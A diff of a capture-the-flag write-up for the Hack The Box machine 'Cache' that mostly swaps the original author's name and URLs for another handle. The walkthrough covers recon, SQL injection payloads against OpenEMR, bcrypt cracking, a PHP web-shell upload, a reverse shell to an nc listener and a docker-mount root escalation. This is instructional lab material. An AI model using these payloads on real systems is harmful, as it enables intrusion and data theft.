@@ -9,12 +9,13 @@ avatar: assets/htb/cache.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Cache
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
 ```text
-zweilos@kali:~/htb/cache$ nmap -p- -sC -sV -oN cache.nmap <YOUR_IP>
+kac0@kali:~/htb/cache$ nmap -p- -sC -sV -oN cache.nmap <YOUR_IP>
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-09 11:32 EDT
 Nmap scan report for <YOUR_IP>
 Host is up (0.053s latency).
@@ -36,9 +37,9 @@ Nmap done: 1 IP address (1 host up) scanned in 35.10 seconds
 
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-cache.htb.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-cache.htb.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2.5-author-john.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2.5-author-john.png)
 
 [http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E\#](http://<YOUR_IP>/contactus.html?firstname=test&lastname=test&country=australia&subject=%3Cscript%3Ealert%28%22test%22%29%3C%2Fscript%3E#)
 
@@ -70,15 +71,15 @@ message submission results in url
 + 1 host(s) tested
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-login-page%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-login-page%2520%25281%2529.png)
 
 login.html seems to be rabbit hole. Never attempts to actually send data. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-net.html.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-net.html.png)
 
 bypassing the page by loading `net.html` seen in the source leads to "under construction" page.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/6-under-construction.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-under-construction.png)
 
 ```text
 HTTP/1.1 200 OK
@@ -103,7 +104,7 @@ body  {
 </head>
 <center>
     <h1> Welcome Back!</h1>
-    <img src="https://raw.githubusercontent.com/zweilosec/htb-writeups/master/4202252.jpg">
+    <img src="https://raw.githubusercontent.com/kac0/htb-writeups/master/4202252.jpg">
 
 <h1>This page is still underconstruction</h1>
 </center>
@@ -111,18 +112,18 @@ body  {
 </html>
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4.5-jquery-functionality.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4.5-jquery-functionality.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5.5-jquery.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5.5-jquery.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/5-functionality.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-functionality.png)
 
 found some credentials in the `functionality.js` file in the `/jquery` folder. `ash:H@v3_fun` This enabled me to login to the site, which I had already discovered to hold nothing useful. This password did not work for logging into SSH. I decided to try to use my `cewl` wordlist to see if I could enumerate a proper password now that I had a username. Nothing came back.
 
-Next I tried enumerating subdomains using virtual host enumeration as described in the HTB machine [Forwardslash](https://zweilosec.gitbook.io/htb-writeups/linux-machines/hard/forwardslash-write-up#virtual-host-enumeration)
+Next I tried enumerating subdomains using virtual host enumeration as described in the HTB machine [Forwardslash](https://kac0.gitbook.io/htb-writeups/linux-machines/hard/forwardslash-write-up#virtual-host-enumeration)
 
 ```text
-zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+kac0@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -160,14 +161,14 @@ Found: sklep_test.cache.htb (Status: 400) [Size: 422]
 I wasn't sure if any of these were useful \(or reachable, rather\) so I loaded up a bunch of other wordlists to try again until I got something that looked useful.
 
 ```text
-zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/
+kac0@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/
 bitquark-subdomains-top100000.txt                 shubs-stackoverflow.txt
 deepmagic.com-prefixes-top50000.txt               shubs-subdomains.txt
 deepmagic.com-prefixes-top500.txt                 sortedcombined-knock-dnsrecon-fierce-reconng.txt
 dns-Jhaddix.txt                                   subdomains-top1million-110000.txt
 fierce-hostlist.txt                               subdomains-top1million-20000.txt
 namelist.txt                                      subdomains-top1million-5000.txt
-zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt 
+kac0@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -189,7 +190,7 @@ Found: www_.cache.htb (Status: 400) [Size: 422]
 ```
 
 ```text
-zweilos@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
+kac0@kali:~/htb/cache$ gobuster vhost -u http://cache.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -211,7 +212,7 @@ Found: *.cache.htb (Status: 400) [Size: 422]
 All of these 400 errors were somewhat promising since those sites seem to exist but my requests to them aren't correct.
 
 ```text
-zweilos@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/zweilos/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://<YOUR_IP>
+kac0@kali:~/htb/cache$ wfuzz --hh 8193 -w /home/kac0/htb/cache/cache.cewl -H "Host: FUZZ.htb" http://<YOUR_IP>
 
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 
@@ -238,7 +239,7 @@ Requests/sec.: 190.7288
 
 `--hh 8193` filters out replies that are 8193 chars long, which was what it replied for pretty much everything, even if it didn't exist.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-openemr.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-openemr.png)
 
 add to hosts navigating to `http://hms.htb` redirects to a login page at `http://hms.htb/interface/login/login.php?site=default` the creds from the previous site do not work here
 
@@ -246,41 +247,41 @@ add to hosts navigating to `http://hms.htb` redirects to a login page at `http:/
 
 [https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting\#Arbitrary](https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/12-hms-dirbuster.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-hms-dirbuster.png)
 
 ran dirbuster: shows admin.php 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/10-hms-admin.php.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-hms-admin.php.png)
 
 which shows the version of this site. \(5.0.1\(3\)\) Searching for a vulnerability for this site leads to CVE-2019-8371 [https://www.cvedetails.com/cve/CVE-2019-8371/](https://www.cvedetails.com/cve/CVE-2019-8371/) 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/29-vuln-reportpdf%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/29-vuln-reportpdf%2520%25281%2529.png)
 
 There is also a vulnerability report that I found that deals with this specific version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) This report details `admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/13-sql-patch.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-sql-patch.png)
 
 `sql_patch.php`=reveals current patch level "OpenEMR Version = 5.0.1\(3\)"
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/7-hms-public.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-hms-public.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/11-setup.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-setup.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/14-register.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14-register.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/15-messaging.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-messaging.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/16-secure-chat.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-secure-chat.png)
 
 Since the patient portal didnt seem to reveal any useful information, I moved on to the next section, SQL injection. The first example sounded interesting, because combined with the patient portal bypass, I could use the authenticated SQLi vulnerability.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/17-duplicate-query.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-duplicate-query.png)
 
 ```text
 http://hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
 ```
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/18-system-user%2520%25281%2529.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/18-system-user%2520%25281%2529.png)
 
 ```text
 /portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))
@@ -553,7 +554,7 @@ Table: users_secure
 The table contained information about a `openemr_admin` user, including a bcrypt hashed password. I loaded the hash into hashcat and it cracked almost imediately.
 
 ```text
-zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/zweilos/rockyou_utf8.txt 
+kac0@kali:~/htb/cache/results/<YOUR_IP>/scans$ hashcat -m 3200 -a 0 '$2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.' /home/kac0/rockyou_utf8.txt 
 hashcat (v6.0.0) starting...
 
 Hashes: 1 digests; 1 unique digests, 1 unique salts
@@ -568,7 +569,7 @@ Applicable optimizers:
 Host memory required for this attack: 65 MB
 
 Dictionary cache hit:
-* Filename..: /home/zweilos/rockyou_utf8.txt
+* Filename..: /home/kac0/rockyou_utf8.txt
 * Passwords.: 14344373
 * Bytes.....: 140056879
 * Keyspace..: 14344373
@@ -581,7 +582,7 @@ Hash.Name........: bcrypt $2*$, Blowfish (Unix)
 Hash.Target......: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEc...F6P0B.
 Time.Started.....: Mon Aug 10 09:35:23 2020 (1 sec)
 Time.Estimated...: Mon Aug 10 09:35:24 2020 (0 secs)
-Guess.Base.......: File (/home/zweilos/rockyou_utf8.txt)
+Guess.Base.......: File (/home/kac0/rockyou_utf8.txt)
 Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........:     2450 H/s (12.06ms) @ Accel:8 Loops:32 Thr:1 Vec:8
 Recovered........: 1/1 (100.00%) Digests
@@ -597,15 +598,15 @@ Stopped: Mon Aug 10 09:35:25 2020
 
 This was one lazy admin. The password was `xxxxxx`.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/19-login.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/19-login.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/20-administrator-portal.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/20-administrator-portal.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/21-acl.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/21-acl.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/22-users.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/22-users.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/23-file-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/23-file-upload.png)
 
 can edit files in `/var/www/hms.htb/public_html/sites/default`
 
@@ -616,11 +617,11 @@ according to vulnerability report pdf can read and write arbitrary files on the 
 
   on the page `/portal/import_template.php`
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/25-burp-rce-upload.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/25-burp-rce-upload.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/26-rce.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/26-rce.png)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/24-etc-passwd.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/24-etc-passwd.png)
 
 Got `/etc/passwd`, can see that `luffy`, `ash`, and `root` are the only users that can log in. Played around with running commands with a simple shell, then remembered that I had downloaded a python exploit that required authentication to the portal to work. `mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
 
@@ -814,8 +815,8 @@ Now that I had valid credentials to the portal, I could use exploit.py from earl
 ran the exploit
 
 ```text
-zweilos@kali:~/htb/cache$ vim exploit.py 
-zweilos@kali:~/htb/cache$ python3 ./exploit.py 
+kac0@kali:~/htb/cache$ vim exploit.py 
+kac0@kali:~/htb/cache$ python3 ./exploit.py 
 [+] Authentication with credentials provided please be patient
 [+] Uploading a payload it will take a minute
 [+] You should be getting a shell
@@ -824,7 +825,7 @@ zweilos@kali:~/htb/cache$ python3 ./exploit.py
 then in my other terminal
 
 ```text
-zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
+kac0@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
 listening on [any] 12346 ...
 connect to [10.10.15.57] from (UNKNOWN) [<YOUR_IP>] 34384
 Linux cache 4.15.0-109-generic #110-Ubuntu SMP Tue Jun 23 02:39:32 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -840,8 +841,8 @@ $ which python3
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@cache:/$ ^Z
 [1]+  Stopped                 nc -lvnp 12346
-zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ stty raw -echo
-zweilos@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
+kac0@kali:~/htb/cache/results/<YOUR_IP>/scans$ stty raw -echo
+kac0@kali:~/htb/cache/results/<YOUR_IP>/scans$ nc -lvnp 12346
 
 www-data@cache:/$ export TERM=xterm-256color
 www-data@cache:/$ clear
@@ -865,7 +866,7 @@ ash@cache:/dev/shm$
 
 ```text
 ash@cache:/dev/shm$ cat ~/user.txt
-d123****2776
+d123************************2776
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -1150,5 +1151,5 @@ luffy@cache:~$ docker run -v /:/mnt --rm -it --privileged 2ca708c1c9cc chroot /m
 uid=0(root) gid=0(root) groups=0(root)
 5cbf7e7969b8
 # cat /root/root.txt
-90c1****c458
+90c1************************c458
 ```
